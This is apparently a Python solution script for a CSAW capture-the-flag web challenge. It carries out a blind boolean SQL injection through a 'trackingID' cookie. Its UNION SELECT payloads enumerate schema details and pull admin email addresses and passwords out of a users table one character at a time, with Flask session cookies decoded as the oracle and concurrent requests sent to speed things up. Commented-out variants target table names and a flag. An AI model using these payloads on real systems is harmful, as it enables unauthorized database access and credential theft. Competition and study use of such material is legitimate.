import grequests
import base64
import json
import zlib
from tqdm import trange, tqdm
import string
import time

def send_payload(payload):
    c = {}
    c["trackingID"] = payload
    r = grequests.get("http://web.csaw.io:5800/", cookies=c)
    return r

def recv_requests(reqs):
    rets = []
    for r in reqs:
        session = r.cookies["session"]
        # flask token
        if session.startswith("."):
            info = session.split(".")[1]
            info = base64.urlsafe_b64decode(info + "==")
            info = zlib.decompress(info)
        else:
            info = base64.urlsafe_b64decode(session.split(".")[0] + "==").decode()
        rets.append("Error" not in json.loads(info)["email"])
    return rets

# payload = "' UNION SELECT 0,1 FROM information_schema.tables WHERE table_schema=database() AND 1=1 -- x"
# send_payload(payload)

# payload = f"' UNION (SELECT 0,1 FROM information_schema.tables WHERE table_schema=database() AND ({i}=(LENGTH(table_name))) LIMIT 0,1) -- x"

# for j in range(8):
# payload = f"' UNION (SELECT 0,1 FROM information_schema.tables WHERE table_schema=database() AND ({LENGTH}=LENGTH(table_name)) AND (1=(ASCII(SUBSTR(TABLE_NAME,{LENGTH-i},1)) >> {j} & 1)) LIMIT 0,1) -- x"

# payload = f"' UNION (SELECT 0,1 FROM users WHERE {i}=(SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_NAME='users')) -- x"

alphabet = """0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$&'()*+,-./:;<=>?@[\]^`{|}~"""
# alphabet = """0123456789abcdefghijklmnopqrstuvwxyz!"#$&'()*+,-./:;<=>?@[\]^`{|}~"""

def recursor_email(known, i):
    time.sleep(0.5)
    reqs = []
    for c in tqdm(alphabet):
        payload = f"' UNION (SELECT 0,1 FROM users WHERE privilege LIKE BINARY 'admin' AND email LIKE BINARY '{known + c}%') -- x"
        reqs.append(send_payload(payload))

    reqs = grequests.map(reqs)
    data = recv_requests(reqs)
    rets = []
    if all(d == False for d in data):
        return [known]
    else:
        for j, d in enumerate(data):
            if d:
                print(alphabet[j])
                rets += recursor_email(known + alphabet[j], i+1)
        print(rets)
        return rets

def recursor_password(email, known, i):
    print(i, known)
    time.sleep(0.5)
    reqs = []
    for c in alphabet:
        payload = f"' UNION (SELECT 0,1 FROM users WHERE email LIKE BINARY '{email}' AND password LIKE BINARY '{known + c}%') -- x"
        reqs.append(send_payload(payload))

    reqs = grequests.map(reqs)
    data = recv_requests(reqs)
    rets = []
    if all(d == False for d in data):
        return [known]
    else:
        for j, d in enumerate(data):
            if d:
                # print(alphabet[j])
                rets += recursor_password(email, known + alphabet[j], i+1)
        # print(rets)
        return rets

def recursor_dbs(known, i):
    time.sleep(0.5)
    reqs = []
    for c in tqdm(alphabet):
        payload = f"' UNION (SELECT 1,column_name FROM information_schema.columns WHERE TABLE_NAME='trackingid' AND column_name LIKE BINARY '{known + c}%') -- x"
        reqs.append(send_payload(payload))

    reqs = grequests.map(reqs)
    data = recv_requests(reqs)
    rets = []
    if all(d == False for d in data):
        return [known]
    else:
        for j, d in enumerate(data):
            if d:
                print(alphabet[j])
                rets += recursor_dbs(known + alphabet[j], i+1)
        print(rets)
        return rets


email = 'emily.brown@mta.com'
print(recursor_password(email, "", 0))


# reqs = []
# # print(recursor_dbs("", 0))

# # for i in range(0, 250):
# #     payload = f"' UNION (SELECT 0,1 FROM users WHERE {i}=(SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_NAME='users')) -- x"
# #     reqs.append(send_payload(payload))

# for c in alphabet:
#     payload = f"' UNION (SELECT 0,1 FROM users WHERE privilege LIKE BINARY 'admin{c}%') -- x"
#     reqs.append(send_payload(payload))

# reqs = grequests.map(reqs)
# data = recv_requests(reqs)
# print(data)
# print("".join([str(int(d)) for d in data]))
# print(alphabet)
# print(data.index(True))

# emails = ['james.martin@mta.com']

# for email in emails:
#     print(email, recursor_password(email, "", 0))

# payload = f"' UNION SELECT 1,flag from flag WHERE REGEXP_LIKE(flag, '^{test}'  -- x"

# known = ""
# import string
# alpha = "{}!@#$%^%&*()" + string.ascii_letters + string.digits + "_"
# while True:
#     for c in alpha:
#         test = known + c
#         payload = "' UNION SELECT 1,table_name from information_schema.tables WHERE REGEXP_LIKE(table_name, '^{test}') LIMIT 0,1 -- x'"
#         if run_payload(payload):
#             known += c
#             print(known)
#             break
#         print(False, c)
#     else:
#         break
